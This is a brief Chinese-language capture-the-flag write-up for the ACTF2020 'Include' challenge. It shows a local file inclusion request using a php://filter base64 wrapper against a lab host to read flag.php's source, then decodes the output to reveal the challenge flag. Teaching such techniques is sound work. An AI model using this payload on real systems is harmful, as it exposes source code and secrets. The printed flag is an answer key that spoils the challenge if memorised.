## [ACTF2020 新生赛]Include

打开题目，点TIPS，发现URL上面有`?file=flag.php`

已经提示的很明显了，直接用php伪协议读取

```web-idl
http://81ed096f-fe93-42cb-af08-1ced7427897d.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php
```

得到

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OWZhYzkzZmMtMjAxMy00NjA5LWIzNWQtMTUzODJhODI3Y2Q1fQo=
```

base64解码得到

```php
<?php
echo "Can you find out the flag?";
//flag{9fac93fc-2013-4609-b35d-15382a827cd5}
```

